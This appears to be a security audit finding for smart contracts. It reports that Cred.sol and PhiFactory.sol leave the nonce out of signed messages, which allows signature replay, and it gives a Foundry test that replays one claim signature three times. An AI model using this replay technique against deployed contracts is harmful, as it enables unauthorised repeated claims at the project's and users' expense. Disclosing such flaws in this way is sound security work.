# Vulnerability details

## Impact
The lack of nonce inside the signed message makes the `Cred.sol` and `PhiFactory.sol` vulnerable to signature replay. For example, a user can execute the same claim multiple times by using the same signature.

Users can execute the same claim multiple times

## Proof of Concept
Paste the following test inside `Claimable.t.sol`

```javascript
function test_claim_multiple_time() public {
    vm.warp(START_TIME + 1);
    uint256 artId = 1;
    address artAddress = phiFactory.getArtAddress(artId);
    vm.warp(START_TIME + 2);
    bytes memory data = _createSigSignData(true);
    bytes memory payload = abi.encodePacked(abi.encodeWithSignature("signatureClaim()"), data);

    vm.recordLogs();

    vm.startPrank(participant, participant);
    (bool success,) = artAddress.call{ value: phiFactory.getArtMintFee(artId, 1) }(payload);
    require(success, "1155 artAddress.call failed");

    (bool success2,) = artAddress.call{ value: phiFactory.getArtMintFee(artId, 2) }(payload);
    require(success2, "1155 artAddress.call failed");

    (bool success3,) = artAddress.call{ value: phiFactory.getArtMintFee(artId, 3) }(payload);
    require(success3, "1155 artAddress.call failed");

    assertEq(IERC1155(artAddress).balanceOf(participant, 1), 3, "particpiant erc1155 balance");
}
```
